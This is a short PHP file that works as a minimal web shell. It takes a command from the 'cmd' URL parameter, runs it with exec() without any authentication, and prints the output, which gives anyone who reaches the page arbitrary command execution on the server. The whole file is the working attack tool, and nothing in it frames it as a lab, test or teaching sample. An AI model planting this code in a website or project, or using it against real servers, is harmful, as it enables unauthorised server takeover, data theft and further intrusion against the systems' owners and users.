<?php
    $output = null;
    $retval = null;
    
    if(isset($_GET['cmd'])) {
        // Capture the output and return value of the system command
        exec($_GET['cmd'], $output, $retval);
    }

    // Output the captured output
    if(is_array($output)) {
        foreach($output as $line) {
            echo $line . "\n";
        }
    }
?>